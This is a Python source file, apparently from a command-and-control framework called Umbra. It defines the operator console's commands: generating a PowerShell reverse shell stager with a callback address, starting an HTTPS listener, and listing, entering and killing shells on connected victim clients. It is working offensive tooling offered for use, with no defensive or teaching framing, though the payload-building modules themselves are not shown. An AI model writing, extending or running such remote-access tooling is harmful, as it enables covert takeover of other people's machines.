from src.Utilities     import *
from src.TLS           import *
from src.Payload       import *
from src.ClientHandler import *
from src.TextAssets    import *

import sys

# A structured approach to handling user input / commands is, obviously, define
# commands beforehand. When commands are defined, they get minimum and maximum
# arguments able to be applied to a command. All methods are linked to said
# command as well as detailed help messages.

class CommandHandler:
        def __init__(self):
                self.umbra_server       = None
                self.commands           = {
                        "shell" : {
                                "min_args" : 1,
                                "max_args" : 1,
                                "function" : self.shell,
                                "descript" : """ \r shell [client_id]     Enter into a shell with a given client ID.
                                                 \r                       Find all current client IDs using 'sessions'.
                                """
                        },
                        "sessions" : {
                                "min_args" : 0,
                                "max_args" : 0,
                                "function" : self.sessions,
                                "descript" : """ \r sessions            : Lists all currently connected clients with
                                                 \r                       their respective IDs, IPs, OS, Username, and
                                                 \r                       current connectivity status.
                                """
                        },
                        "generate" : {
                                "min_args" : 0,
                                "max_args" : 1,
                                "function" : self.generate,
                                "descript" : """ \r generate [+]        : Generates a powershell reverse shell stager
                                                 \r                       payload by default. Can generate: [encode]
                                                 \r                       or [raw]
                                """
                        },
                        "jobs" : {
                                "min_args" : 0,
                                "max_args" : 0,
                                "function" : self.jobs,
                                "descript" : """ \r jobs                : Lists current services running.
                                """
                        },
                        "start" : {
                                "min_args" : 2,
                                "max_args" : 3,
                                "function" : self.start,
                                "descript" : """ \r start [service] [+] : Starts a service with given optional parameters.
                                                 \r                       Ex:
                                                 \r                       start [callback_address] [listen_port] [dwell_time]
                                """
                        },
                        "stop" : {
                                "min_args" : 0,
                                "max_args" : 0,
                                "function" : self.stop,
                                "descript" : """ \r stop [service]      : Stops the HTTPS service. Does not terminate any
                                                 \r                       connection that are currently held with service.
                                """
                        },
                        "kill" : {
                                "min_args" : 1,
                                "max_args" : 1,
                                "function" : self.kill,
                                "descript" : """ \r kill [client_id]   : Terminates client connection with given client ID.
                                """
                        },
                        "eradicate" : {
                                "min_args" : 0,
                                "max_args" : 0,
                                "function" : self.eradicate,
                                "descript" : """ \r eradicate          : Terminates all sessions.
                                """
                        },
                        "help" : {
                                "min_args" : 0,
                                "max_args" : 1,
                                "function" : self.get_help,
                                "descript" : """ \r help [+]           : Displays unique help menu to a specific command.
                                """
                        },
                        "clear" : {
                                "min_args" : 0,
                                "max_args" : 0,
                                "function" : self.clear,
                                "descript" : """ \r clear              : Clears the terminal.
                                """
                        },
                        "exit" : {
                                "min_args" : 0,
                                "max_args" : 0,
                                "function" : self.done,
                                "descript" : """ \r exit               : Gracefully shuts down services and closes any
                                                 \r                      client connections.
                                """
                        }
                }

        # The easiest path to sanitization is to lower and split the user
        # input. This sets up for easy command / argument validation.

        @Public.Method
        def command(self, user_input) -> None:
                if not user_input:
                        return

                split_input             = user_input.lower().split()
                command                 = split_input[0]
                arguments               = split_input[1:]

                if not self.validate(command, len(arguments)):
                        return

                self.commands[command]["function"](*arguments)

        @Private.Method
        def validate(self, command: str, number_arguments: int) -> bool:
                if command not in self.commands:
                        debug("Command '{}' does not exist.".format(command))
                        return False

                if number_arguments < self.commands[command]["min_args"]:
                        debug("Command '{}' needs at least {} argument(s).".format(command, str(self.commands[command]["min_args"])))
                        return False

                if number_arguments > self.commands[command]["max_args"]:
                        debug("Command '{}' needs at most {} argument(s).".format(command, str(self.commands[command]["max_args"])))
                        return False

                return True

        @Private.Method
        def shell(self, client_identifier: str) -> None:
                client_identifier       = client_identifier.upper()

                if client_identifier not in self.umbra_server.clients:
                        debug("Client '{}' does not exist.".format(client_identifier))
                        return

                client                  = self.umbra_server.clients[client_identifier]

                if client.status == "Lost":
                        debug("Cannot communicate with a lost client.")
                        return

                client_handler          = ClientHandler(client)
                client_handler.set_up()
                client_handler.begin_communication()

        @Private.Method
        def sessions(self) -> None:
                if not self.umbra_server.clients:
                        info("There are no sessions available.")
                        return

                sessions(self.umbra_server.clients)

        @Private.Method
        def jobs(self) -> None:
                jobs(self.umbra_server)

        @Private.Method
        def generate(self, payload_type: str = "encoded") -> None:
                info("Generating {} payload...".format(payload_type))

                clienthello                 = Response.ClientHello(self.umbra_server.server.identifier)
                clienthello_64              = Payload.base_64(clienthello)
                payload                     = Payload.enc(self.umbra_server.callback_ip, self.umbra_server.callback_port, clienthello_64)

                if payload_type == "raw":
                        sys_print("\r{}\n".format(gray(payload)))
                        flush()

                if payload_type == "encoded":
                        powershell_ready    = Payload.powershell(payload)
                        sys_print("\r{}\n".format(gray(powershell_ready)))
                        flush()

        @Private.Method
        def start(self, address: str, port: str, timeout: str = "2000") -> None:
                if self.umbra_server.server.running:
                        return

                info("Starting Server at https://0.0.0.0:{}".format(port))
                self.umbra_server.callback_ip = address
                self.umbra_server.callback_port = int(port)
                self.umbra_server.time = int(timeout)

                if not self.umbra_server.startup((address, int(port))):
                        debug("Server was not started.")

                success("Server Successfully Started.")

        @Private.Method
        def stop(self) -> None:
                info("Stopping Server at https://0.0.0.0:{}".format(self.umbra_server.server.bind_agent.getsockname()[1]))

                if not self.umbra_server.server.running:
                        return

                self.umbra_server.kill()
                success("Server Successfully Stopped.")

        @Private.Method
        def kill(self, client_identifier: str) -> None:
                client_identifier       = client_identifier.upper()
                client                  = self.umbra_server.clients[client_identifier]

                if client_identifier not in self.umbra_server.clients:
                        return

                if client.status == "Lost":
                        return

                client.connection.close()
                client.status           = "Lost"

        @Public.Method
        def eradicate(self) -> None:
                for client_identifier in self.umbra_server.clients.keys():
                        client          = self.umbra_server.clients[client_identifier]
                        client.status   = "Lost"
                        client.connection.close()

                success("All clients terminated.")

        @Private.Method
        def get_help(self, command: str = None) -> None:
                if not command:
                        get_help()
                        return
                
                if command not in self.commands:
                        debug("Command '{}' does not exist.".format(command))
                        return

                get_command_help(self.commands[command]["descript"])

        @Private.Method
        def clear(self) -> None:
                sys.stdout.write('\033c')

        @Private.Method
        def done(self) -> None:
                self.eradicate()
                exit()